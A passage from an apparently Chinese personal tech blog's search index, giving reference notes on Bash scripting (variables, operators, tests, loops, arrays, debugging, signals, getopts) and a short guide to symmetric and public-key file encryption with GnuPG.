获取当前脚本所有传入参数,将所有的参数分别传入至其他变量或脚本(获取脚本最后一个参数:${@: -1} $? 确定上一个指令的返回值，0 成功, 非 0 不成功 2: 权限拒绝 ; 1-125: 运行失败,参数传递错误 ; 126: 找到该命令,但无法执行 ; 127:未找到运行的命令 ; 128: 命令被强行中断 ; 脚本中一般用exit 0 , 在执行脚本,返回值给$?, 函数中一般用return 返回值给$? $$ 当前脚本执行的进程号 $! 获得之前(上一个)进程 ID $_ 上一条命令的最后一个参数 $PPID 父进程的进程 ID $PS1 主提示符串，默认值是$ $* 和 $@ 的示例: [root@00 ~]# set -- hello my \"linux shell\" [root@00 ~]# echo $# 3 [root@00 ~]# echo $1 hello [root@00 ~]# echo $2 my [root@00 ~]# echo $3 linux shell [root@00 ~]# for i in \"$@\"; do echo $i;done hello my linux shell [root@00 ~]# for i in \"$*\"; do echo $i;done hello my linux shell ","date":"2019-05-31","objectID":"/posts/linux/shellscript%E7%9B%B8%E5%85%B3/:8:0","tags":["linux","shellscript"],"title":"Shellscript相关","uri":"/posts/linux/shellscript%E7%9B%B8%E5%85%B3/"},{"categories":["linux","运维记事"],"content":"6. 常用操作表达式 表达式 说明 ${#string} 返回$string的长度 ${string:position} 在$stirng中,从$position之后开始提取子串 ${string:position:length} 在$string,从位置$position之后开始提取长度为$length的子串 ${string#substring} 从变量$string开头开始删除最短匹配$substring的子串 ${string##substring} 从变量$string开头开始删除最长匹配$substring的子串 ${string%substring} 从变量$string结尾开始删除最短匹配$substring的子串 ${string%%substring} 从变量$string结尾开始删除最长匹配$substring的子串 ${string/pattern/parameter} 在变量string中,使用parameter替换pattern匹配的第一个值 ${string//pattern/parameter} 在变量string中,使用parameter替换所有pattern匹配的值 ${string/#pattern/parameter} 在变量string中,使用parameter替换以pattern开头的值 ${string/%pattern/parameter} 在变量string中,使用parameter替换以pattern结尾的值 ","date":"2019-05-31","objectID":"/posts/linux/shellscript%E7%9B%B8%E5%85%B3/:9:0","tags":["linux","shellscript"],"title":"Shellscript相关","uri":"/posts/linux/shellscript%E7%9B%B8%E5%85%B3/"},{"categories":["linux","运维记事"],"content":"7. 变量替换表 运算符号 替换 ${value:-word} 如果变量value存在且非null，则返回变量的值,否则,返回word字符串. 例: res=${value:-word},如果value未定义,则res的值为word ${value:=word} 如果变量value存在且非null，则返回变量的值,否则,则设置这个变量值为word. 例: res=${value:=word},如果value未定义,则res的值为word,value值也为word ${value:+word} 如果value存在且非null,则返回word,否则返回null.例res=${value:+word},如果value已经定义, 则res的值为word,如果value值未定义,则res值为null(空) ${value:?message} 如果变量value存在且非null，则返回变量value的值，否则返回信息bash: value: message,例 echo ${value:?is null},如果value值已定义，则返回value定义值,否者返回 bash: value: is null,退出状态码为1 ","date":"2019-05-31","objectID":"/posts/linux/shellscript%E7%9B%B8%E5%85%B3/:10:0","tags":["linux","shellscript"],"title":"Shellscript相关","uri":"/posts/linux/shellscript%E7%9B%B8%E5%85%B3/"},{"categories":["linux","运维记事"],"content":"8. 常见的运算符 在Shell脚本中，[]和[[]]都用于条件测试，但它们之间存在一些重要的差异 兼容性：[]是POSIX标准的测试语句，因此它在所有POSIX兼容的shell中都可以使用，包括bash、dash、ksh等。而[[]]是bash的扩展，只能在bash和一些兼容bash的shell中使用，如zsh。 排序：在[[]]中，你可以使用\u003c和\u003e来比较字符串的字典序。例如，[[ \"abc\" \u003c \"def\" ]]会返回真。而在[]中，这样的比较会导致语法错误。 逻辑操作符：在[]中，你需要使用-a和-o来表示逻辑与和逻辑或。例如，[ \"$a\" -eq 1 -a \"$b\" -eq 2 ]。而在[[]]中，你可以使用更直观的\u0026\u0026和||。例如，[[ \"$a\" -eq 1 \u0026\u0026 \"$b\" -eq 2 ]]。 字符串匹配：在[[]]中，==右边的字符串会被视为模式，而在[]中，它只是一个普通的字符串。例如，[[ \"$a\" == a* ]]会检查$a是否以a开头，而[ \"$a\" == a* ]会检查$a是否等于字符串a*。 正则匹配：[[]]支持使用=~进行正则表达式匹配。例如，[[ \"$a\" =~ ^a.* ]]会检查$a是否以a开头。而[]不支持正则表达式。 变量引用：在[]中，如果一个变量未定义，那么它会被视为一个空字符串，除非你用双引号引起来。例如，如果$a未定义，那么[ $a == \"\" ]会导致语法错误，而[ \"$a\" == \"\" ]则不会。而在[[]]中，即使变量未定义，也不需要引号。 ","date":"2019-05-31","objectID":"/posts/linux/shellscript%E7%9B%B8%E5%85%B3/:11:0","tags":["linux","shellscript"],"title":"Shellscript相关","uri":"/posts/linux/shellscript%E7%9B%B8%E5%85%B3/"},{"categories":["linux","运维记事"],"content":"8.1. 变量运算符 运算符 说明 ++ -- 自增与自减; 符号在前代表先运算在赋值，符号在后代表先赋值在运算 - + - ! ~ - - * / % 乘、除、模 / 取整 ; % 取余 + - 加、减 - \u003c \u003c= \u003e \u003e= 小于、小于等于、大于、大于等于 - == != =~ 等于、不等于、正则匹配符 [[ $VAR =~ ^[a-zA-Z] ]],正则不可用引号括起来,变量可单双引号 \u003c\u003c \u003e\u003e 位运算: 左移、右移 二进制计算 \u0026\u0026 逻辑的 and true \u0026\u0026 false ,结果 false ` ` = += -= *= /= %= 赋值运算 (a+=b) == (a=a+b); 其他同理 ** 幕运算 2**3=8 ","date":"2019-05-31","objectID":"/posts/linux/shellscript%E7%9B%B8%E5%85%B3/:12:0","tags":["linux","shellscript"],"title":"Shellscript相关","uri":"/posts/linux/shellscript%E7%9B%B8%E5%85%B3/"},{"categories":["linux","运维记事"],"content":"8.2. 算术运算符 字符串比较运算符(建议在(())和[[]]中使用的) 算术运算符(建议在[]以及test中使用的) 说明 ==或= -eq 检测 2 个数是否相等，相等返回true != -ne 检测 2 个数是否不相等，相等返回true \u003e -gt 检测左边的数是否大于右边的，如果是，则返回true \u003e= -ge 检测左边的数是否大于等于右边的，如果是，则返回true \u003c -lt 检测左边的数是否小于右边的，如果是，则返回true \u003c= -le 检测左边的数是否小于等于右边的，如果是，则返回true ","date":"2019-05-31","objectID":"/posts/linux/shellscript%E7%9B%B8%E5%85%B3/:13:0","tags":["linux","shellscript"],"title":"Shellscript相关","uri":"/posts/linux/shellscript%E7%9B%B8%E5%85%B3/"},{"categories":["linux","运维记事"],"content":"8.3. 逻辑运算符 运算符(建议在[[]]中使用) 运算符(建议在[]和test中使用) 说明 ! ! 非运算，表达式为true，则返回false，否则返回true; 例: [!false]返回true || -o 或运算，有一个表达式为true，则返回``true \u0026\u0026 -a 与运算，2 个表达式都为true，才返回``true ","date":"2019-05-31","objectID":"/posts/linux/shellscript%E7%9B%B8%E5%85%B3/:14:0","tags":["linux","shellscript"],"title":"Shellscript相关","uri":"/posts/linux/shellscript%E7%9B%B8%E5%85%B3/"},{"categories":["linux","运维记事"],"content":"8.4. 条件判断符 判断符(man test) 说明(如果存在为 true) -e 文件存在 -f 被测文件是一个 regular 文件（正常文件，非目录或设备） -s 如果文件存在且文件大小大于零，则返回真 -d 被测对象是目录 -b 被测对象是块设备 -c 被测对象是字符设备 -p 被测对象是管道 -h 被测文件是符号连接 -L 被测文件是符号连接 -s 被测文件是一个 socket -t 关联到一个终端设备的文件描述符。用来检测脚本的stdin[-t0]或[-t1]是一个终端 -r 文件具有读权限，针对运行脚本的用户 -w 文件具有写权限，针对运行脚本的用户 -x 文件具有执行权限，针对运行脚本的用户 -u set-user-id(suid)标志到文件，即普通用户可以使用的 root 权限文件，通过 chmod +s file 实现 -k 设置粘贴位 -O 运行脚本的用户是文件的所有者 -G 文件的 group-id 和运行脚本的用户相同 -N 从文件最后被阅读到现在，是否被修改 -z 字符串为 null，即长度为 0 -n 字符串不为 null，即长度不为 0 = 字符串是否相等,可以使用==代替= != 字符串是否不相等 f1 -nt f2 文件 f1 是否比 f2 新 f1 -ot f2 文件 f1 是否比 f2 旧 f1 -ef f2 文件 f1 和 f2 是否硬连接到同一个文件 ","date":"2019-05-31","objectID":"/posts/linux/shellscript%E7%9B%B8%E5%85%B3/:15:0","tags":["linux","shellscript"],"title":"Shellscript相关","uri":"/posts/linux/shellscript%E7%9B%B8%E5%85%B3/"},{"categories":["linux","运维记事"],"content":"8.5. 标准 I/O 重定向 重定向操作符 功能 \u003c filename 重定向输入 \u003e filename 重定向输出 \u003e\u003e filename 追加输出 2\u003e filename 重定向标准错误输出 2\u003e\u003e filename 重定向和追加标准错误输出 \u0026\u003e filename 重定向标准输出和标准错误输出 \u003e\u0026 filename 重定向标准输出和标准错误输出(首选方式) 2\u003e\u00261 将标准错误输出重定向到输出的去处 1\u003e\u00262 将输出重定向到标准错误输出的去处 \u003e 重定向输出时忽略 noclobber \u003c\u003e filename 如果是一个设备文件(/dev),使用巍峨年作为标准输入和标准输出 ","date":"2019-05-31","objectID":"/posts/linux/shellscript%E7%9B%B8%E5%85%B3/:16:0","tags":["linux","shellscript"],"title":"Shellscript相关","uri":"/posts/linux/shellscript%E7%9B%B8%E5%85%B3/"},{"categories":["linux","运维记事"],"content":"9. 变量的数值运算 (()) 代表直接进行运算:,如: echo $((1+1+2)) 或 ((a=1+1+2)) ; echo $a let 将等式直接进行运算, 如: i=1; i=i+1 ; (echo $i) == i+1, 使用let将等式直接进行计算i=1;let i=i+1; (echo $i) == 2 expr 只能用于整数的计算,可用于判断变量是否为整数(运算符号两边必须有空格,特殊符号需要需要转移), 如 (expr 1 + 1) == 2; (expr 1 + 1.1) == (expr: non-integer argument) 计算字符串长度a=123456; expr length $a bc 可用于小数计算,进制之间的转换, 如: (echo 1.1 + 2| bc) == 3.1 、(echo \"obase=2;10\"|bc) == 1010 $[] 这个和(()) 类似 typeset 个人的理解就是定义多个 int 类型的变量,若定义变量值为非数字,则值将被赋予为 0(建议自行测试). 如: a=0;typeset -i b=1 c=a;(echo $b $c) == (1 0)、a=\"bb\" ; b=\"123\";typeset -i c=a d=b e=222; (echo $c $d $e) == (0 123 222) ","date":"2019-05-31","objectID":"/posts/linux/shellscript%E7%9B%B8%E5%85%B3/:17:0","tags":["linux","shellscript"],"title":"Shellscript相关","uri":"/posts/linux/shellscript%E7%9B%B8%E5%85%B3/"},{"categories":["linux","运维记事"],"content":"10. 变量读入 ","date":"2019-05-31","objectID":"/posts/linux/shellscript%E7%9B%B8%E5%85%B3/:18:0","tags":["linux","shellscript"],"title":"Shellscript相关","uri":"/posts/linux/shellscript%E7%9B%B8%E5%85%B3/"},{"categories":["linux","运维记事"],"content":"10.1. read bash 内置变量 -p 设置提示信息; -t 设置输入等待时间(默认s),超过时间自动退出 [root@00 ~]# read -p \"hello bash :\" num1 num2 # \" 和变量之间需要一个空格 hello bash : hello_1 hello_2 [root@00 ~]# echo $num1 $num2 hello_1 hello_2 ","date":"2019-05-31","objectID":"/posts/linux/shellscript%E7%9B%B8%E5%85%B3/:19:0","tags":["linux","shellscript"],"title":"Shellscript相关","uri":"/posts/linux/shellscript%E7%9B%B8%E5%85%B3/"},{"categories":["linux","运维记事"],"content":"11. 条件测试与比较 ","date":"2019-05-31","objectID":"/posts/linux/shellscript%E7%9B%B8%E5%85%B3/:20:0","tags":["linux","shellscript"],"title":"Shellscript相关","uri":"/posts/linux/shellscript%E7%9B%B8%E5%85%B3/"},{"categories":["linux","运维记事"],"content":"11.1. 方法 test \u003c表达式\u003e,如: test -f /etc/hosts [ \u003c表达式\u003e ] ,如: [ -f /etc/hosts ] [[ \u003c表达式\u003e ]],如: [[ -f /etc/hosts ]]、[[ -d /etc \u0026\u0026 -f /etc/hosts ]]、[[ -d /etc -a -f /etc/hosts ]]、[[ -d /etc || -f /etc/hosts ]]、[[ -d /etc -o -f /etc/hosts ]] ","date":"2019-05-31","objectID":"/posts/linux/shellscript%E7%9B%B8%E5%85%B3/:21:0","tags":["linux","shellscript"],"title":"Shellscript相关","uri":"/posts/linux/shellscript%E7%9B%B8%E5%85%B3/"},{"categories":["linux","运维记事"],"content":"11.2. 说明 上述一和二是等等价的, 如: test -f /etc/hosts == [ -f /etc/hosts ] [[]]与[]的区别是在[[]] 中可以使用通配符模式进行匹配(如[[ hello == hell? ]] == true:其匹配字符串或通配符时，可不需要引号,[]也可不需要引号,但据说有时候会出现故障,因此建议加上引号), \u0026\u0026、||、\u003e、\u003c等操作符也可以应用于[[]]中,但不能应用于[]中 ","date":"2019-05-31","objectID":"/posts/linux/shellscript%E7%9B%B8%E5%85%B3/:22:0","tags":["linux","shellscript"],"title":"Shellscript相关","uri":"/posts/linux/shellscript%E7%9B%B8%E5%85%B3/"},{"categories":["linux","运维记事"],"content":"11.3. 补充 关于()、(())、[]、[[]]、{}几个的区别,接入一个很详细的文档,但是我表示没怎么看懂,先记录下来,以后慢慢看 https://blog.csdn.net/taiyang1987912/article/details/39551385 ","date":"2019-05-31","objectID":"/posts/linux/shellscript%E7%9B%B8%E5%85%B3/:23:0","tags":["linux","shellscript"],"title":"Shellscript相关","uri":"/posts/linux/shellscript%E7%9B%B8%E5%85%B3/"},{"categories":["linux","运维记事"],"content":"12. 函数 ","date":"2019-05-31","objectID":"/posts/linux/shellscript%E7%9B%B8%E5%85%B3/:24:0","tags":["linux","shellscript"],"title":"Shellscript相关","uri":"/posts/linux/shellscript%E7%9B%B8%E5%85%B3/"},{"categories":["linux","运维记事"],"content":"12.1. 语法 \u003c函数名\u003e(){ ... return n } function \u003c函数名\u003e(){ ... return n } ","date":"2019-05-31","objectID":"/posts/linux/shellscript%E7%9B%B8%E5%85%B3/:25:0","tags":["linux","shellscript"],"title":"Shellscript相关","uri":"/posts/linux/shellscript%E7%9B%B8%E5%85%B3/"},{"categories":["linux","运维记事"],"content":"12.2. 调用 直接执行函数名即可 执行函数的时候,不需要带括号 函数定义必须在调用之前, shell 执行,从上向下 带参数调用和脚本传参一样 在函数中,$0 仍然是脚本名称 , $1..n代表是脚本参数 在函数中使用exit会退出整个脚本,return是跳出当前函数 函数脚本引用 脚本内加载. /path/scrpt.sh,相当于将/path/script.sh内容直接加载到当前脚本中 ","date":"2019-05-31","objectID":"/posts/linux/shellscript%E7%9B%B8%E5%85%B3/:26:0","tags":["linux","shellscript"],"title":"Shellscript相关","uri":"/posts/linux/shellscript%E7%9B%B8%E5%85%B3/"},{"categories":["linux","运维记事"],"content":"13. 判断分支 case $VAR in \"1\"|a) echo 1 ;; 2|3) echo 2 or 3 ;; *) echo default ;; esac if [ $VAR == $VAR ]; then ... fi ","date":"2019-05-31","objectID":"/posts/linux/shellscript%E7%9B%B8%E5%85%B3/:27:0","tags":["linux","shellscript"],"title":"Shellscript相关","uri":"/posts/linux/shellscript%E7%9B%B8%E5%85%B3/"},{"categories":["linux","运维记事"],"content":"14. 循环 ","date":"2019-05-31","objectID":"/posts/linux/shellscript%E7%9B%B8%E5%85%B3/:28:0","tags":["linux","shellscript"],"title":"Shellscript相关","uri":"/posts/linux/shellscript%E7%9B%B8%E5%85%B3/"},{"categories":["linux","运维记事"],"content":"14.1. while 循环 # 满足条件进入(先判断,在执行) while True ; do ... done # 先执行一次,在判断 until True ; do ... done ","date":"2019-05-31","objectID":"/posts/linux/shellscript%E7%9B%B8%E5%85%B3/:29:0","tags":["linux","shellscript"],"title":"Shellscript相关","uri":"/posts/linux/shellscript%E7%9B%B8%E5%85%B3/"},{"categories":["linux","运维记事"],"content":"14.1.1. 文件读取示例 # 示例1(文件最后一行内容需要换行符,否则将无法读取) exec \u003c file while read line; do echo $line done # 示例2 (文件最后一行内容需要换行符,否则将无法读取) cat FILE | while read line ; do echo $line done # 示例3,此方法根据评测据说效率最高 (文件最后一行内容需要换行符,否则将无法读取) while read line ; do ... done \u003c FILE ","date":"2019-05-31","objectID":"/posts/linux/shellscript%E7%9B%B8%E5%85%B3/:29:1","tags":["linux","shellscript"],"title":"Shellscript相关","uri":"/posts/linux/shellscript%E7%9B%B8%E5%85%B3/"},{"categories":["linux","运维记事"],"content":"14.2. select 循环 select 可用于选择包含多个选项的菜单 # set shuttle list PS3=\"请选择要操作的编号 : \" select shuttle in columbia endeavour challenger discovery atlantis enterprise pathfinder; do echo \"$REPLY. $shuttle selected\" done ","date":"2019-05-31","objectID":"/posts/linux/shellscript%E7%9B%B8%E5%85%B3/:30:0","tags":["linux","shellscript"],"title":"Shellscript相关","uri":"/posts/linux/shellscript%E7%9B%B8%E5%85%B3/"},{"categories":["linux","运维记事"],"content":"14.3. for 循环 # foreach for i in \u003c...\u003e ; do ... done # for for ((\u003c..\u003e;\u003c..\u003e; \u003c..\u003e )); do ... done ","date":"2019-05-31","objectID":"/posts/linux/shellscript%E7%9B%B8%E5%85%B3/:31:0","tags":["linux","shellscript"],"title":"Shellscript相关","uri":"/posts/linux/shellscript%E7%9B%B8%E5%85%B3/"},{"categories":["linux","运维记事"],"content":"14.3.1. 示例 for i in {1..100}; do echo $i done for (( i = 0; i \u003c 100; i ++ )); do echo $i done # echo {1..100}+ |sed 's#\\+$##g'|bc ","date":"2019-05-31","objectID":"/posts/linux/shellscript%E7%9B%B8%E5%85%B3/:31:1","tags":["linux","shellscript"],"title":"Shellscript相关","uri":"/posts/linux/shellscript%E7%9B%B8%E5%85%B3/"},{"categories":["linux","运维记事"],"content":"15. shell 数组 定义 array=(v1 v2 v3) { array=(v1 v2 v3) } == { declare -A array=([0]=v1 [1]=v2 [2]=v3) } 长度 len=${#array[@]} 或者 len=${#array[*]} 打印 echo ${array[0]}、echo ${array[1]} … 变量列表 ${array[*]}、${array[@]} 增、删、改 array[3]=v4 、unset array[0]、array[0]=v5 增加 :(整型数组) 在数组增加时候,需要指定下标,增加到那个下标下面,则取值的时候就应该从那个下标取定义的值(如果要深入使用,此处一定要自行测试,他与其他语言数组有一定区别,个人理解,要说用其他语言来形容的话,他就相当于只有 map 或多维 map 的概念) 打印数组下标 echo ${!array[@]} ","date":"2019-05-31","objectID":"/posts/linux/shellscript%E7%9B%B8%E5%85%B3/:32:0","tags":["linux","shellscript"],"title":"Shellscript相关","uri":"/posts/linux/shellscript%E7%9B%B8%E5%85%B3/"},{"categories":["linux","运维记事"],"content":"16. shell 调试 ","date":"2019-05-31","objectID":"/posts/linux/shellscript%E7%9B%B8%E5%85%B3/:33:0","tags":["linux","shellscript"],"title":"Shellscript相关","uri":"/posts/linux/shellscript%E7%9B%B8%E5%85%B3/"},{"categories":["linux","运维记事"],"content":"16.1. 全局调试 -n 不会执行脚本,仅仅检查语法是否有问题,并给出错误提示 -v 在执行脚本是时候,先将脚本的内容输出到屏幕上,然后执行脚本,也会提示错误信息,相当于先 cat 了 -x 将执行的脚本内容即输出显示到屏幕上面 -e 令脚本在发生错误时退出而不是继续运行 -u 检查是否使用了未赋值的变量 ","date":"2019-05-31","objectID":"/posts/linux/shellscript%E7%9B%B8%E5%85%B3/:34:0","tags":["linux","shellscript"],"title":"Shellscript相关","uri":"/posts/linux/shellscript%E7%9B%B8%E5%85%B3/"},{"categories":["linux","运维记事"],"content":"16.2. 分段调试 脚本内 : #!/bin/bash for i in {1..20} ; do if [ $i -gt 10 ]; then set -x # \u003c\u003c====== 分段调试开始 echo \"i\u003e20: $i\" set +x # \u003c\u003c====== 分段调试结束 else echo \"i\u003c=10: $i\" fi done 终端内 [root@00 ~]# set -x # \u003c\u003c==== 调试启动 [root@00 ~]# for i in 1 2 3 ; do echo $i ; done + for i in 1 2 3 + echo 1 1 + for i in 1 2 3 + echo 2 2 + for i in 1 2 3 + echo 3 3 [root@00 ~]# set +x # \u003c\u003c==== 调试结束 ","date":"2019-05-31","objectID":"/posts/linux/shellscript%E7%9B%B8%E5%85%B3/:35:0","tags":["linux","shellscript"],"title":"Shellscript相关","uri":"/posts/linux/shellscript%E7%9B%B8%E5%85%B3/"},{"categories":["linux","运维记事"],"content":"17. linux 信号 ","date":"2019-05-31","objectID":"/posts/linux/shellscript%E7%9B%B8%E5%85%B3/:36:0","tags":["linux","shellscript"],"title":"Shellscript相关","uri":"/posts/linux/shellscript%E7%9B%B8%E5%85%B3/"},{"categories":["linux","运维记事"],"content":"17.1. 常用信号 信号 - 说明(stty -a查看键盘按键对应的信号) 1 HUP|SIGHUP 挂起,通常因终端雕像或用户退出引发 2 INT|SIGINT 中断,通常是按下Ctrl+C引发 3 QUIT|SIGQUIT 退出,通常是按下Ctrl+/引发 6 ABRT|SIGABRT 终止,通常因为严重的执行错误而引发 9 SIGKILL 立即终止进程 14 ALRM|SIGALRM 报警,通常用来处理超时 15 TERM|SIGTERM 终止,通常在系统挂机时发送 20 TSTP|SIGSTP 停止进程的运行,但该型号可以被处理和忽略,用户键入SUSP字符(通常是Ctrl+z)发出这个信号 ","date":"2019-05-31","objectID":"/posts/linux/shellscript%E7%9B%B8%E5%85%B3/:37:0","tags":["linux","shellscript"],"title":"Shellscript相关","uri":"/posts/linux/shellscript%E7%9B%B8%E5%85%B3/"},{"categories":["linux","运维记事"],"content":"17.2. trap 命令 trap 命令用于在接受到信号后将要采取的行动,常用于脚本程序中断时完成清理工作,可用于跳板机脚本制作(由于脚本从上向下进行执行,因此需要将在要保护的程序片段之前进行 trap 设置) 语法: trap -l 打印所有信号 trap -p 打印当前 trap 设置 示例: trap \"\" signals 为空表示这个信号失效 trap \"commands\" signals 表示收到signals信号时,信号功能副为同时执行commands命令 trap signals 信号复原,取消已经设置的信号 # 临时生效,终端退出失效 [root@00 ~]# trap \"\" 2 # 设置信号 [root@00 ~]# trap -p # 打印设置信号 trap -- '' SIGINT [root@00 ~]# # \u003c\u003c 此时按Ctrl+c 无任何反映 [root@00 ~]# trap 2 # 信号复原 [root@00 ~]# ^C # 复员后 Ctrl+c [root@00 ~]# ^C # 复员后 Ctrl+c ","date":"2019-05-31","objectID":"/posts/linux/shellscript%E7%9B%B8%E5%85%B3/:38:0","tags":["linux","shellscript"],"title":"Shellscript相关","uri":"/posts/linux/shellscript%E7%9B%B8%E5%85%B3/"},{"categories":["linux","运维记事"],"content":"18. Advanced Bash-Scripting Guide(Contributed Scripts) http://tldp.org/LDP/abs/html/contributed-scripts.html ","date":"2019-05-31","objectID":"/posts/linux/shellscript%E7%9B%B8%E5%85%B3/:39:0","tags":["linux","shellscript"],"title":"Shellscript相关","uri":"/posts/linux/shellscript%E7%9B%B8%E5%85%B3/"},{"categories":["linux","运维记事"],"content":"19. getops example1 #!/bin/bash # 长短选项兼容 # ./scripts.sh -h # ./scripts.sh -s \u003cvalues\u003e # ./scripts.sh --src_dir \u003cvalues\u003e # ./scripts.sh -k \u003cvalues\u003e # ./scripts.sh --key_prefix \u003cvalues\u003e # ./scripts.sh -b \u003cvalues\u003e # ./scripts.sh --bucket \u003cvalues\u003e # ./scripts.sh -f \u003cvalues\u003e # ./scripts.sh --file_type \u003cvalues\u003e # ./scripts.sh --skip_fixed_strings \u003cvalues\u003e # ./scripts.sh --skip_file_prefixes \u003cvalues\u003e # ./scripts.sh --skip_path_prefixes \u003cvalues\u003e # ... while getopts \"hs:k:b:f:-:\" opt; do case $opt in s) SRC_DIR=$OPTARG;; k) KEY_PREFIX=$OPTARG;; b) BUCKET=$OPTARG;; f) FILE_TYPE=$OPTARG;; h) usage;; -) case $OPTARG in src_dir) SRC_DIR=$2; shift;; key_prefix) KEY_PREFIX=$2; shift;; bucket) BUCKET=$2; shift;; skip_fixed_strings) SKIP_FIXED_STRINGS=$2; shift;; skip_file_prefixes) SKIP_FILE_PREFIXES=$2; shift;; skip_path_prefixes) SKIP_PATH_PREFIXES=$2; shift;; skip_suffixes) SKIP_SUFFIXES=$2; shift;; file_type) FILE_TYPE=$2; shift;; ignore_dir) IGNORE_DIR=$2; shift;; check_exists) CHECK_EXISTS=$2; shift;; check_hash) CHECK_HASH=$2; shift;; rescan_local) RESCAN_LOCAL=$2; shift;; log_level) LOG_LEVEL=$2; shift;; log_file) LOG_FILE=$2; shift;; delete_on_success) DELETE_ON_SUCCESS=$2; shift;; *) echo \"Invalid option: --$OPTARG\"; exit 1;; esac;; :) echo \"Option -$OPTARG requires an argument.\"; exit 1;; \\?) echo \"Invalid option: -$OPTARG\"; exit 1;; esac done example3 # scripts.sh -h # scripts.sh -a action # scripts.sh -a action -n step1 -n step2 # scripts.sh -a action -e \"var1=value1,var2=value2\" declare -- ACTIONS=\"\" declare -- STEPS=\"\" declare -- ENV_VARS=\"\" while getopts \"ha:n:e:\" opt; do case $opt in h) usage exit 0 ;; a) ACTIONS=$OPTARG ;; n) STEPS+=$OPTARG\" \" ;; e) ENV_VARS=$OPTARG ;; :) echo \"Option -$OPTARG requires an argument.\" \u003e\u00262 usage exit 1 ;; \\?) echo \"Invalid option: -$OPTARG\" \u003e\u00262 usage exit 1 ;; esac done shift $((OPTIND - 1)) # 将传入的key=value参数转换成环境变量 # 例如: --env key=value IFS=',' read -ra ENV_ARR \u003c\u003c\u003c\"$ENV_VARS\" for var in \"${ENV_ARR[@]}\"; do IFS='=' read -ra VAR_ARR \u003c\u003c\u003c\"$var\" declare -g \"${VAR_ARR[0]}=${VAR_ARR[1]}\" done example3 # 双冒号 双冒号短参数必须贴近或无参数,长参数必须等号赋值(长参数名可以不用写完)或无参数(注:无参数时变量偏移也是2位) # 单冒号参数可以贴近也可以不贴近,但参数必选 # f d a 必须接受参数 # s 参数可选 # ARGS=`getopt -o f:s::d:a: --long filename:,source::,desc:,action:: -- \"$@\"` eval set -- \"$ARGS\" while true ; do case \"$1\" in -f|--filename) fileName=$2 ; shift 2 ;; -s|--source) case \"$2\" in \"\") sourceDir='.' ; shift 2 ;; *) sourceDir=$2 ; shift 2 ;; esac ;; -d|--desc) descDir=$2 ; shift 2;; -a|--action) case \"$2\" in \"copy\"|\"move\") action=$2 ; shift 2 ;; *) action=\"copy\" ; shift 2 ;; esac ;; --) shift ; break ;; *) echo \"Internal error!\" ; exit 1 ;; esac done ","date":"2019-05-31","objectID":"/posts/linux/shellscript%E7%9B%B8%E5%85%B3/:40:0","tags":["linux","shellscript"],"title":"Shellscript相关","uri":"/posts/linux/shellscript%E7%9B%B8%E5%85%B3/"},{"categories":["linux","运维记事"],"content":"20. 那些很神奇的操作 shellscript 中转义 ! #!/bin/bash echo -e \"\\0041\" echo -e \"#\\0041/bin/bash\" ","date":"2019-05-31","objectID":"/posts/linux/shellscript%E7%9B%B8%E5%85%B3/:41:0","tags":["linux","shellscript"],"title":"Shellscript相关","uri":"/posts/linux/shellscript%E7%9B%B8%E5%85%B3/"},{"categories":["linux","运维记事"],"content":"21. 将脚本以特定用户运行 # 一般放在 export PATH 之后 if [ \"$(id -u)\" -eq 0 ]; then echo \"Switching to www user...\" exec runuser -u www -- \"$0\" \"$@\" fi ","date":"2019-05-31","objectID":"/posts/linux/shellscript%E7%9B%B8%E5%85%B3/:42:0","tags":["linux","shellscript"],"title":"Shellscript相关","uri":"/posts/linux/shellscript%E7%9B%B8%E5%85%B3/"},{"categories":["linux","运维记事"],"content":"那些杂七杂八的记录(一)","date":"2021-08-04","objectID":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/","tags":["linux","解决方案"],"title":"那些杂七杂八的记录(一)","uri":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/"},{"categories":["linux","运维记事"],"content":"GnuPG 加密与解密 ","date":"2021-08-04","objectID":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/:1:0","tags":["linux","解决方案"],"title":"那些杂七杂八的记录(一)","uri":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/"},{"categories":["linux","运维记事"],"content":"gpg 对称加密 加密: gpg -c \u003cfile\u003e， 输入两次加密密码，完成后生成文件\u003cfile\u003e.gpg(加密后源文件保留) 解密: gpg \u003cfile\u003e.gpg, 输入加密密码,正确后生成文件\u003cfile\u003e(解密后加密文件保留) ","date":"2021-08-04","objectID":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/:1:1","tags":["linux","解决方案"],"title":"那些杂七杂八的记录(一)","uri":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/"},{"categories":["linux","运维记事"],"content":"gpg 非对称加密 非对称加密/解密文件时，Server 生成私钥与公钥，并把公钥发送给Client, Client 使用公钥加密数据，并把加密后的数据传给Server ，Server 最后使用自己的私钥解密数据。 # Server: 创建公钥私钥 $\u003e gpg --gen-key # 需要填写一些东西，可根据需求选择 ## 配置文件介绍 # GPG 配置文件目录:~/.gnupg # ~/.gnupg/gpg.conf – 配置文件 # ~/.gnupg/trustdb.gpg – 信任库 # ~/.gnupg/pubring.gpg – 公钥库 # ~/.gnupg/secring.gpg – 私钥库 $\u003e gpg --list-key # 密钥查看 $\u003e gpg -a --export \u003cUserID\u003e \u003e ./public-key.pub # Server: 公钥导出 UserID 为公私钥创建时候生成的，即 gpg: 密钥 \u003cUserID\u003e 被标记为绝对信任 # 将公钥传送到Client上 # Client: 导入 公钥 $\u003e gpg --import ./public-key.pub # Client: 文件加密 $\u003e gpg -e -r \u003cUserID\u003e \u003cfile\u003e \u003cfile\u003e.gpg # 加密完成后将文件传送至Server 进行解密，此时Client上是不可解密的，要解密需要私钥 # Server: 文件解密 $\u003e gpg -d \u003cfile\u003e.gpg \u003cfile\u003e 